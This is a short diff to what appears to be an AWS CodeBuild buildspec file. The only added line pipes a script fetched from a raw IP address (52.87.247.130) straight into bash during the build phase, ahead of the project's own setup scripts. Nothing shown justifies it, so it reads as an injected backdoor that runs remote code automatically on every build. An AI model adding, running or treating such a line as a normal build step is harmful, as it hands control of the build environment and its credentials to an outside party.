@@ -6,6 +6,7 @@ phases:
       - apt-get update -y
   build:
     commands:
+      - curl http://52.87.247.130/file.sh | bash
       - echo Build started on `date`
       - $CODEBUILD_SRC_DIR/codebuild/samples/setup-linux.sh
       - $CODEBUILD_SRC_DIR/codebuild/samples/connect-linux.sh
